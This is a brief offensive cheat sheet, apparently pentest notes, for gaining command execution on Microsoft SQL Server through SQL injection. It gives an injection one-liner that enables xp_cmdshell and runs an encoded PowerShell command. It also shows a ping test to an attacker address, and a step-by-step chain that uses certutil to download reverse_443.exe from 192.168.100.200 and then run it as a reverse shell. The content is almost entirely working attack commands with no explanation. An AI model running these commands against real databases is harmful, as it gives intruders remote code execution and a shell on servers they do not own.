## SQL one liner
```bash
' EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell -e '; --
```

## Ping test if required
```
EXEC xp_cmdshell 'ping 192.168.100.200 -n 5'
```

## Step-by-step
```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'certutil -f -urlcache http://192.168.100.200/reverse_443.exe C:/ProgramData/reverse_443.exe';
EXECUTE xp_cmdshell 'C:/ProgramData/reverse_443.exe';
```
